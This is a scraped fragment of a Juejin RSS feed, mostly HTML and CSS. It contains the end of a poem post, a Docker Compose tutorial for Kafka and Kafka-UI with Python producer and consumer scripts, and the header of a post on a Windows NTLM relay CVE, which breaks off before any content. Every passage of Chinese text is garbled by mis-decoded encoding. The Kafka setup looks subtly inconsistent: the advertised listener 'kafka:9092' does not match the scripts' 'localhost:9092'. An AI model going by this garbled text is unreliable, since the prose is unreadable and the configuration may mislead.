5V/IUOvNtsapU2zJXSyj0xVB13sPfq0kkZA7dubIIKXIlJ8Cy7u+BN22RVcr+peOuxHdcBbA04FAVmEoEtO5vX55K4KVZS1QJvBBzU1rgUl8JapBNYIowLoZtD9NWRTWKqqe36L48BSz8QPH9epqqIDehlh2UuqocEmrdV7AvhuRoM74m80yeDIEX3ppreNN235FxV58DNjhswn5K8zK21+5ctjut6NmUIoy9tVvitnHr2VDM3ahtW8KQ/Vbsp9GGiWHfk8skyTSFz9/HdxhHe4uR/RxX/mG1SGXwypcDJNmCMfucZ/C1CuCQUbiBUDYbe7tiRkZX8GIat50d+wqR1fdN7ygGzrHrcN4kGFHK02cil5M6INgQVsvnNz77T5PqUFYJJInYmIBplJfP5On4eiOwYfhuCD44oLyYVs43rI1rk3H7usttzq8Qo3j84vavN9mOkAeuq8dHEd9NtCVKX51Oen+MM6IEYvz5StOehKLpIjD+nKU5AQWJpLizdB+1sb5LQvFRxbSJVGHmSdK/0WWaPguEYmcSJ68aWkK6rAw6jwSSCmrTWVHT96R7HwHANEgqybVJL+E2vE2q7Uu91Gr73SbbNUvZDtiOlCeIv4r/AI+0XUwz1lvcAAAAAElFTkSuQmCC");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"â";top:8px;left:5px}.markdown-body blockquote:after{content:"â";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ˜¥é£æ‹‚æŸ³ç»¿çƒŸè½»ï¼Œ<br/>
èŠ±å½±æµèºæ»¡å²¸ç”Ÿã€‚<br/>
ä¸€å¤œé›¨å£°å‚¬ä¸‡ç‰©ï¼Œ<br/>
ä¸œé£åˆæŠŠæ—§å±±æ˜ã€‚</p>
<p>å¤äº‘å·å°½å¤©å¿ƒè¿œï¼Œ<br/>
è·å¶æ— å°˜æ˜ æ°´æ¸…ã€‚<br/>
è›™å”±ç¨»é¦™çœ æœˆä¸‹ï¼Œ<br/>
é“¶æ²³å€’æ˜ æ¢¦åˆæˆã€‚</p>
<p>ç§‹æ¥éœœæŸ“æ«å¦‚ç«ï¼Œ<br/>
é›å½±æƒŠå¯’ç…§ç¢§æ™´ã€‚<br/>
ä¸€å£¶æ–°é…’é‚€æ˜æœˆï¼Œ<br/>
é»„å¶é£˜é›¶ä¸æ‹åº­ã€‚</p>
<p>å†¬é›ªæ¶ˆå£°å¤©åœ°å¯‚ï¼Œ<br/>
æ¾ææŒ‚ç‰å¤œæ— å£°ã€‚<br/>
æ¢…èŠ±ä¸‰å¼„é¦™çŠ¹åœ¨ï¼Œ<br/>
ç¬‘å¯¹æµå¹´ä¸‡å¤æƒ…ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Docker Composeä¸€é”®éƒ¨ç½²Kafkaä¸Kafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿]]></title>    <link>https://juejin.cn/post/7592451588848435219</link>    <guid>https://juejin.cn/post/7592451588848435219</guid>    <pubDate>2026-01-08T02:22:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592451588848435219" data-draft-id="7592452108798476331" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Docker Composeä¸€é”®éƒ¨ç½²Kafkaä¸Kafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿"/> <meta itemprop="keywords" content="Kafka,Docker"/> <meta itemprop="datePublished" content="2026-01-08T02:22:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†°å—çš„æ—…è¡Œ"/> <meta itemprop="url" content="https://juejin.cn/user/3773179636746007"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Docker Composeä¸€é”®éƒ¨ç½²Kafkaä¸Kafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3773179636746007/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†°å—çš„æ—…è¡Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:22:37.000Z" title="Thu Jan 08 2026 02:22:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Docker Composeä¸€é”®éƒ¨ç½²Kafkaä¸Kafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿</h2>
<p>æä¾›ä¸€ä¸ªå®Œæ•´çš„ã€ç»è¿‡éªŒè¯çš„Docker Composeéƒ¨ç½²æ–¹æ¡ˆï¼ŒåŒ…æ‹¬Kafkaé›†ç¾¤å’ŒKafka-UIå¯è§†åŒ–ç®¡ç†é¢æ¿ï¼Œä»¥åŠPython Kafkaç”Ÿäº§æ¶ˆè´¹ç¤ºä¾‹ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€éƒ¨ç½²Kafkaä¸Kafka-UI</h3>
<h4 data-id="heading-2">1. åˆ›å»ºç›®å½•ç»“æ„</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> -p kafka-compose &amp;&amp; <span class="hljs-built_in">cd</span> kafka-compose
</code></pre>
<h4 data-id="heading-3">2. åˆ›å»ºdocker-compose.ymlæ–‡ä»¶</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3.5'</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">zookeeper:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">wurstmeister/zookeeper</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">zookeeper</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"2181:2181"</span>
  
  <span class="hljs-attr">kafka:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">wurstmeister/kafka</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">kafka</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/localtime:/etc/localtime</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"9092:9092"</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">KAFKA_ZOOKEEPER_CONNECT:</span> <span class="hljs-string">zookeeper:2181</span>
      <span class="hljs-attr">KAFKA_ADVERTISED_LISTENERS:</span> <span class="hljs-string">INSIDE://kafka:9092</span>
      <span class="hljs-attr">KAFKA_LISTENERS:</span> <span class="hljs-string">INSIDE://0.0.0.0:9092</span>
      <span class="hljs-attr">KAFKA_LISTENER_SECURITY_PROTOCOL_MAP:</span> <span class="hljs-string">INSIDE:PLAINTEXT</span>
      <span class="hljs-attr">KAFKA_LISTENER_NAME_SELECTOR:</span> <span class="hljs-string">INSIDE</span>
      <span class="hljs-attr">KAFKA_INTER_BROKER_LISTENER_NAME:</span> <span class="hljs-string">INSIDE</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">zookeeper</span>
  
  <span class="hljs-attr">kafka-ui:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">provectuslabs/kafka-ui</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">kafka-ui</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"8080:8080"</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">kafka</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">DYNAMIC_CONFIG_ENABLED:</span> <span class="hljs-string">'true'</span>
      <span class="hljs-attr">KAFKA_CLUSTERS_0_NAME:</span> <span class="hljs-string">local</span>
      <span class="hljs-attr">KAFKA_CLUSTERS_0_BOOTSTRAP_SERVERS:</span> <span class="hljs-string">kafka:9092</span>
</code></pre>
<h4 data-id="heading-4">3. å¯åŠ¨æœåŠ¡</h4>
<pre><code class="hljs">docker-compose up -d
</code></pre>
<h4 data-id="heading-5">4. éªŒè¯æœåŠ¡çŠ¶æ€</h4>
<pre><code class="hljs">docker-compose ps
</code></pre>
<h4 data-id="heading-6">5. è®¿é—®Kafka-UI</h4>
<p>æ‰“å¼€æµè§ˆå™¨è®¿é—® <code>http://localhost:8080</code>ï¼Œå³å¯çœ‹åˆ°Kafka-UIçš„ç™»å½•ç•Œé¢ã€‚é¦–æ¬¡ç™»å½•æ— éœ€è´¦å·å¯†ç ï¼Œç›´æ¥è¿›å…¥ç³»ç»Ÿã€‚</p>
<h3 data-id="heading-7">äºŒã€Python Kafkaç”Ÿäº§æ¶ˆè´¹ç¤ºä¾‹</h3>
<h4 data-id="heading-8">1. å®‰è£…ä¾èµ–</h4>
<pre><code class="hljs">pip install kafka-python
</code></pre>
<h4 data-id="heading-9">2. ç”Ÿäº§è€…ä»£ç  (producer.py)</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> kafka <span class="hljs-keyword">import</span> KafkaProducer
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-comment"># é…ç½®KafkaæœåŠ¡å™¨åœ°å€</span>
BOOTSTRAP_SERVERS = [<span class="hljs-string">'localhost:9092'</span>]
TOPIC_NAME = <span class="hljs-string">'test_topic'</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_producer</span>():
    <span class="hljs-string">"""åˆ›å»ºKafkaç”Ÿäº§è€…"""</span>
    <span class="hljs-keyword">return</span> KafkaProducer(
        bootstrap_servers=BOOTSTRAP_SERVERS,
        value_serializer=<span class="hljs-keyword">lambda</span> v: json.dumps(v).encode(<span class="hljs-string">'utf-8'</span>)
    )

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_mock_data</span>():
    <span class="hljs-string">"""ç”Ÿæˆæ¨¡æ‹Ÿæ•°æ®"""</span>
    user_ids = [<span class="hljs-string">'user_001'</span>, <span class="hljs-string">'user_002'</span>, <span class="hljs-string">'user_003'</span>, <span class="hljs-string">'user_004'</span>]
    actions = [<span class="hljs-string">'click'</span>, <span class="hljs-string">'view'</span>, <span class="hljs-string">'purchase'</span>, <span class="hljs-string">'logout'</span>, <span class="hljs-string">'login'</span>]
    
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"user_id"</span>: random.choice(user_ids),
        <span class="hljs-string">"action"</span>: random.choice(actions),
        <span class="hljs-string">"timestamp"</span>: datetime.now().isoformat(),
        <span class="hljs-string">"value"</span>: random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)
    }

<span class="hljs-keyword">def</span> <span class="hljs-title function_">produce_data</span>(<span class="hljs-params">producer, topic</span>):
    <span class="hljs-string">"""æŒç»­ç”Ÿäº§æµ‹è¯•æ•°æ®"""</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-comment"># ç”Ÿæˆæ•°æ®</span>
            data = generate_mock_data()
            <span class="hljs-comment"># å‘é€æ¶ˆæ¯</span>
            producer.send(topic, value=data)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Produced message: <span class="hljs-subst">{data}</span>"</span>)
            time.sleep(<span class="hljs-number">1</span>)  <span class="hljs-comment"># æ¯ç§’å‘é€ä¸€æ¡</span>
    <span class="hljs-keyword">except</span> KeyboardInterrupt:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Stopping producer..."</span>)
    <span class="hljs-keyword">finally</span>:
        producer.close()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    producer = create_producer()
    produce_data(producer, TOPIC_NAME)
</code></pre>
<h4 data-id="heading-10">3. æ¶ˆè´¹è€…ä»£ç  (consumer.py)</h4>
<pre><code class="hljs language-ini" lang="ini">from kafka import KafkaConsumer
import json

<span class="hljs-comment"># åˆ›å»ºæ¶ˆè´¹è€…å®ä¾‹å¹¶é…ç½®å‚æ•°</span>
<span class="hljs-attr">consumer</span> = KafkaConsumer(
    'test_topic',  <span class="hljs-comment"># è®¢é˜…çš„ä¸»é¢˜å</span>
    <span class="hljs-attr">bootstrap_servers</span>=[<span class="hljs-string">'localhost:9092'</span>],  <span class="hljs-comment"># KafkaæœåŠ¡å™¨åœ°å€åˆ—è¡¨</span>
    <span class="hljs-attr">group_id</span>=<span class="hljs-string">'mygroup'</span>,  <span class="hljs-comment"># æ¶ˆè´¹è€…ç»„ID</span>
    <span class="hljs-attr">auto_offset_reset</span>=<span class="hljs-string">'earliest'</span>  <span class="hljs-comment"># å½“æ²¡æœ‰åˆå§‹åç§»é‡æˆ–å½“å‰åç§»é‡æ— æ•ˆæ—¶ï¼Œè‡ªåŠ¨é‡ç½®åç§»é‡åˆ°æœ€æ—©çš„è®°å½•</span>
)

<span class="hljs-comment"># æ¶ˆè´¹æ¶ˆæ¯å¾ªç¯</span>
for message in consumer:
    <span class="hljs-comment"># è§£ææ¶ˆæ¯</span>
    <span class="hljs-attr">data</span> = json.loads(message.value.decode(<span class="hljs-string">'utf-8'</span>))
    print(f"Consumed message: {data}")
</code></pre>
<h3 data-id="heading-11">ä¸‰ã€ä½¿ç”¨æ­¥éª¤</h3>
<ol>
<li>
<p><strong>å¯åŠ¨Kafkaå’ŒKafka-UI</strong>ï¼š</p>
<pre><code class="hljs">docker-compose up -d
</code></pre>
</li>
<li>
<p><strong>è¿è¡Œç”Ÿäº§è€…</strong>ï¼š</p>
<pre><code class="hljs">python producer.py
</code></pre>
</li>
<li>
<p><strong>è¿è¡Œæ¶ˆè´¹è€…</strong>ï¼š</p>
<pre><code class="hljs">python consumer.py
</code></pre>
</li>
<li>
<p><strong>ä½¿ç”¨Kafka-UI</strong>ï¼š</p>
<ul>
<li>è®¿é—® <code>http://localhost:8080</code></li>
<li>åœ¨Kafka-UIç•Œé¢ä¸­ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹é›†ç¾¤çŠ¶æ€ã€ä¸»é¢˜ã€æ¶ˆè´¹è€…ç»„ç­‰ä¿¡æ¯</li>
</ul>
</li>
</ol>
<h3 data-id="heading-12">å››ã€å¸¸è§é—®é¢˜è§£å†³</h3>
<ol>
<li>
<p><strong>Kafka-UIæ— æ³•è®¿é—®</strong>ï¼š</p>
<ul>
<li>ç¡®è®¤ç«¯å£æ˜ å°„æ˜¯å¦æ­£ç¡®ï¼š<code>- "8080:8080"</code></li>
<li>æ£€æŸ¥å®¹å™¨æ—¥å¿—ï¼š<code>docker logs kafka-ui</code></li>
</ul>
</li>
<li>
<p><strong>Pythonè„šæœ¬è¿æ¥é—®é¢˜</strong>ï¼š</p>
<ul>
<li>ç¡®è®¤KafkaæœåŠ¡å·²å¯åŠ¨ï¼š<code>docker-compose ps</code></li>
<li>ç¡®è®¤ç”Ÿäº§è€…/æ¶ˆè´¹è€…ä»£ç ä¸­çš„<code>bootstrap_servers</code>ä¸å®é™…ç«¯å£ä¸€è‡´ï¼ˆ<code>localhost:9092</code>ï¼‰</li>
</ul>
</li>
<li>
<p><strong>KafkaæœåŠ¡å¯åŠ¨å¤±è´¥</strong>ï¼š</p>
<ul>
<li>æ£€æŸ¥Dockeræ—¥å¿—ï¼š<code>docker logs kafka</code></li>
<li>ç¡®è®¤ZookeeperæœåŠ¡å·²å¯åŠ¨ï¼ˆKafkaä¾èµ–äºZookeeperï¼‰</li>
</ul>
</li>
</ol>
<h3 data-id="heading-13">äº”ã€Kafka-UIåŠŸèƒ½ç®€ä»‹</h3>
<p>Kafka-UIæä¾›äº†ä»¥ä¸‹å®ç”¨åŠŸèƒ½ï¼š</p>
<ul>
<li><strong>é›†ç¾¤ç›‘æ§</strong>ï¼šæŸ¥çœ‹é›†ç¾¤å¥åº·çŠ¶æ€ã€ç‰ˆæœ¬ä¿¡æ¯</li>
<li><strong>ä¸»é¢˜ç®¡ç†</strong>ï¼šåˆ›å»ºã€ä¿®æ”¹ã€åˆ é™¤ä¸»é¢˜</li>
<li><strong>æ¶ˆè´¹è€…ç»„ç®¡ç†</strong>ï¼šæŸ¥çœ‹å’Œç®¡ç†æ¶ˆè´¹è€…ç»„</li>
<li><strong>å®æ—¶æµé‡ç›‘æ§</strong>ï¼šæŸ¥çœ‹ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…çš„æµé‡</li>
<li><strong>ä¸»é¢˜è¯¦æƒ…</strong>ï¼šæŸ¥çœ‹ä¸»é¢˜çš„åˆ†åŒºã€å‰¯æœ¬ç­‰ä¿¡æ¯</li>
</ul>
<p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œå®ŒæˆKafkaçš„éƒ¨ç½²å’Œå¯è§†åŒ–ç®¡ç†é¢æ¿çš„é…ç½®ï¼Œå¹¶å¼€å§‹ä½¿ç”¨Pythonè¿›è¡ŒKafkaæ¶ˆæ¯çš„ç”Ÿäº§å’Œæ¶ˆè´¹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ­ç§˜CVE-2025-33073ï¼šWindows SMBå®¢æˆ·ç«¯NTLMä¸­ç»§æ”»å‡»ä¸ADIDNSæŠ•æ¯’åˆ©ç”¨é“¾]]></title>    <link>https://juejin.cn/post/7592432859863957538</link>    <guid>https://juejin.cn/post/7592432859863957538</guid>    <pubDate>2026-01-08T01:49:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592432859863957538" data-draft-id="7592432859863924770" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ­ç§˜CVE-2025-33073ï¼šWindows SMBå®¢æˆ·ç«¯NTLMä¸­ç»§æ”»å‡»ä¸ADIDNSæŠ•æ¯’åˆ©ç”¨é“¾"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-01-08T01:49:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" 